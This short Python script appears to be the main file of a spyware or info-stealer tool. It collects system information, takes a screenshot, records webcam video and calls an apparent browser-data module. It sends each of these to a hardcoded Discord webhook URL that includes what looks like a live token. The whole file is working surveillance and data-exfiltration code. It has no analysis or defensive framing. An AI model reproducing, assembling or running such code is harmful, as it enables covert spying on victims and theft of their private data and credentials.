from cap import take_screenshot, send_screenshot
import cam
from lpc import get_system_info
from bro import main
import os

webhook_url = "https://discord.com/api/webhooks/1205108171769905202/-nPkymxlUmsdjFWCRXHDpjWO6opbKHQ8aHaevZFju-5xxswy5yReNuJSLQdLpnK7aKki"
get_system_info(webhook_url)

# Take a screenshot
screenshot_path = take_screenshot()

# Send the screenshot to Discord
send_screenshot(screenshot_path)

# Call record_video to capture video from the webcam
video_path = cam.record_video(video_duration=10, num_cameras=1)

# Then, send the video to Discord
cam.send_video_to_discord(video_path)

main(webhook_url)


